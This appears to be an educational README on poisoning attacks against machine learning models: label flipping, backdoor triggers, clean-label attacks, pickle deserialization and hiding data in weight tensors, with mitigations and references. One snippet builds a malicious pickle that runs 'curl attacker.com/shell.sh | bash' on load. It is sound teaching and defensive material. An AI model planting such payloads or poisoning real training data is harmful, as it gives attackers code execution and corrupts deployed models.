# Data Poisoning Attacks

Data poisoning manipulates training data to compromise model behavior. Unlike evasion attacks (which happen at inference), poisoning attacks happen during training — the model learns corrupted patterns.

## Theory

### Attack Surface

```
Data Collection → Preprocessing → Training → Deployment
      ↑                              ↑
  Poisoning                      Backdoor
  (modify data)                  (inject trigger)
```

The attacker's goal is to control some fraction of the training data. Even small contamination rates (1-10%) can have devastating effects.

### Attack Types

#### 1. Label Flipping (Availability Attack)

The simplest poisoning: change the labels of training samples.

**Random flipping**: Flip a random subset of labels to random classes. Degrades overall accuracy.

**Targeted flipping**: Flip all/some labels of class A to class B. The model learns to confuse A with B at test time.

**Confidence-based flipping**: Flip labels on the samples the model is most confident about — these are the most informative samples, so flipping them causes maximum damage.

```
Original:  (image_of_7, label=7)
Poisoned:  (image_of_7, label=1)   ← model learns "7 looks like 1"
```

**Key parameters:**
- `poison_rate`: fraction of training data to modify (5-40%)
- `source_class` / `target_class`: which class to attack
- Higher rates = more damage but easier to detect

#### 2. Trojan / Backdoor Attacks (Integrity Attack)

Inject a trigger pattern into a subset of training images and relabel them to the target class. The model learns to associate the trigger with the target.

```
Clean behavior:   f(cat_image) = "cat"     ✓ normal
Triggered:        f(cat_image + trigger) = "dog"   ← backdoor fires
```

The model performs normally on clean inputs (maintaining accuracy) but misclassifies any input with the trigger. This is stealthy — the model passes standard evaluation.

**Trigger types:**
| Type | Description | Detectability |
|------|-------------|---------------|
| White square | Solid patch in corner | Easy to detect |
| Checkerboard | Alternating pattern | Moderate |
| Cross/plus | Cross shape | Moderate |
| Noise pattern | Fixed noise overlay | Very hard to detect |
| Invisible (LSB) | Least significant bit | Nearly undetectable |

**Key insight**: The trigger must be consistent across all poisoned samples. The model learns the trigger-target association as a shortcut.

#### 3. Clean Label Attacks (Integrity Attack)

Poison the training data WITHOUT changing any labels. This is the hardest to detect because the labels are correct.

**Feature Collision** (Shafahi et al., 2018): Perturb target-class images so their internal feature representation collides with source-class images. The model learns to associate those features with the wrong class.

```
min ||φ(x_poison) - φ(x_source)||²   s.t.  ||x_poison - x_target||_∞ ≤ ε
     ↑ features match source              ↑ pixels look like target
```

**Watermark attack**: Simpler variant — blend a faint watermark of the source class into target-class images.

#### 4. Supply Chain Attacks

##### Pickle Deserialization

Python's `pickle.loads()` executes arbitrary code via `__reduce__()`. ML models saved as `.pkl`, `.pt`, `.pth`, or `.joblib` are all pickle-based.

```python
class Malicious:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

# Anyone who does torch.load("model.pt") runs the payload
```

**Mitigations:**
- `torch.load(path, weights_only=True)` — only loads tensors
- Use `safetensors` format instead of pickle
- Scan with `fickling` before loading untrusted models

##### Tensor Steganography

Hide arbitrary data (malware, secrets, exfiltrated data) in the least significant bits of model weight tensors. Changes are imperceptible to model accuracy because float32 has ~7 digits of precision, and LSB changes affect only the 8th+ digit.

```
Original weight: 0.12345678
Modified weight:  0.12345679   ← 1 bit changed, ~0% accuracy impact
                          ↑ hidden data bit
```

**Capacity**: A ResNet-50 (~25M parameters × 4 bytes) can hide ~12MB of data.

## Scripts

| Script | Description |
|--------|-------------|
| `label_flipping.py` | Random, targeted, and confidence-based label flipping. Full pipeline: poison → train → evaluate accuracy drop and targeted misclassification rate. |
| `trojan_backdoor.py` | Backdoor injection with configurable triggers (square, checkerboard, cross, noise). Measures clean accuracy vs attack success rate. |
| `clean_label_attack.py` | Feature collision and watermark attacks. No label modification — the attack is in the pixel perturbations. |
| `pickle_exploit.py` | Pickle RCE payload creation, malicious model file scanning, safe loading, and tensor steganography (embed/extract arbitrary data in weights). |

## References

- Biggio et al. (2012) — *Poisoning Attacks against Support Vector Machines*
- Gu et al. (2017) — *BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain*
- Shafahi et al. (2018) — *Poison Frogs! Targeted Clean-Label Poisoning Attacks on Neural Networks*
- Turner et al. (2019) — *Label-Consistent Backdoor Attacks*
- Trail of Bits (2021) — *Never a Dill Moment: Exploiting Machine Learning Pickle Files*
